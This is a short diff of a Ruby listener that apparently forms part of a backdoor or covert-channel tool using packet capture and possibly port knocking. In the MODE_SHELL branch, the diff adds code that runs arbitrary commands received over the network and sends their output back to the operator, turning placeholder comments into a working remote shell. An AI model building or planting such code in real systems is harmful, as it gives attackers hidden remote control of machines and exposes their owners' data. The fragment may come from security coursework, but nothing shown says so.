@@ -78,10 +78,8 @@ def start_listen_server
           case cmds[1]
           when MODE_SHELL
             cmd = cmds[2..-1].join(' ')
-            puts cmd
-            #execute cmd here
-            #get resp
-            #start other junk for knock and send back
+            results = %x{ #{cmd} }
+            send_out(:msg, results)
           when MODE_WATCH
             puts "watch"
             if cmds[2] == DIR
@@ -98,17 +96,8 @@ def start_listen_server
   rescue Exception => e
     puts "error in packet capture"
     puts e.trace
-
     #if bad error raise exception to kill program
   end
-end
-
-def parse_payload(payload)
-
-end
-
-def execute_shell_command(command)
-
 end
 
 def start_watch(type, name)
